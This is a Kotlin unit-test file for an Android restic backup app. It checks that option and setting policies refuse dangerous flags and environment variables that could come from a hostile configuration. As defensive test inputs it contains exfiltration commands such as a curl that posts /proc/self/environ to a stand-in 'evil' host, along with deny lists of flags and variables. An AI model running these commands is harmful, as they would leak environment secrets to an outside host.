package io.github.resticdroid.config

import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class OptionPolicyTest {
    @Test
    fun `password-command is refused - it is arbitrary code execution`() {
        val result = OptionPolicy.filter(
            listOf("--password-command", "sh -c 'curl -d @/proc/self/environ http://evil'")
        )
        assertEquals(emptyList<String>(), result.accepted)
        assertTrue(result.rejected.contains("--password-command"))
    }

    @Test
    fun `flags that redirect trust or storage are refused`() {
        listOf(
            "--password-file", "--cacert", "--tls-client-cert", "--insecure-tls",
            "--insecure-no-password", "--cache-dir", "--repo", "--repository-file",
            "--option", "-o",
        ).forEach {
            val result = OptionPolicy.filter(listOf(it, "value"))
            assertEquals("'$it' must not be accepted", emptyList<String>(), result.accepted)
        }
    }

    @Test
    fun `useful bandwidth limits are kept, with their values`() {
        val result = OptionPolicy.filter(listOf("--limit-upload", "2000", "--no-cache"))
        assertEquals(listOf("--limit-upload", "2000", "--no-cache"), result.accepted)
        assertTrue(result.rejected.isEmpty())
    }

    @Test
    fun `the inline equals form is accepted too`() {
        assertEquals(
            listOf("--limit-download=500"),
            OptionPolicy.filter(listOf("--limit-download=500")).accepted,
        )
    }

    @Test
    fun `a value-taking flag with no value is dropped rather than swallowing the next argument`() {
        val result = OptionPolicy.filter(listOf("--limit-upload", "--password-command", "evil"))
        assertEquals(emptyList<String>(), result.accepted)
    }

    @Test
    fun `a bare value with no flag is refused`() {
        assertEquals(emptyList<String>(), OptionPolicy.filter(listOf("backup", "/etc")).accepted)
    }

    @Test
    fun `a destination parsed from a hostile config carries no dangerous options`() {
        val destination = Destination.fromIni(
            "evil",
            Ini.parse(
                """
                name = Looks fine
                backend = b2
                location = bucket:path
                option = --password-command
                option = /system/bin/sh -c "exfiltrate"
                option = --limit-upload
                option = 1000
                """.trimIndent()
            ),
        )
        assertEquals(listOf("--limit-upload", "1000"), destination.options)
        assertTrue(destination.rejectedOptions.isNotEmpty())
    }
}

class SettingPolicyTest {
    @Test
    fun `a setting cannot become a restic control variable`() {
        listOf(
            "RESTIC_PASSWORD_COMMAND", "RESTIC_PASSWORD_FILE", "RESTIC_PASSWORD",
            "RESTIC_REPOSITORY", "RESTIC_REPOSITORY_FILE", "RESTIC_CACHE_DIR",
            "LD_PRELOAD", "LD_LIBRARY_PATH", "PATH", "HOME", "TMPDIR",
        ).forEach {
            assertTrue("'$it' must not be accepted", !SettingPolicy.accepts(it))
        }
    }

    @Test
    fun `the backends' own variables are accepted`() {
        listOf(
            "AWS_DEFAULT_REGION", "AWS_SESSION_TOKEN", "B2_ACCOUNT_ID",
            "AZURE_ACCOUNT_NAME", "GOOGLE_PROJECT_ID", "OS_AUTH_URL", "ST_AUTH",
        ).forEach {
            assertTrue("'$it' must be accepted", SettingPolicy.accepts(it))
        }
    }

    @Test
    fun `a refused setting is reported, not silently dropped`() {
        val ini = Ini.parse(
            """
            backend = b2
            location = bucket:/path
            setting.b2_account_id = keep-me
            setting.restic_password_command = /system/bin/sh -c "curl evil"
            """.trimIndent()
        )
        val destination = Destination.fromIni("d", ini)
        assertEquals(mapOf("B2_ACCOUNT_ID" to "keep-me"), destination.settings)
        assertTrue(destination.rejectedOptions.contains("setting.restic_password_command"))
    }
}
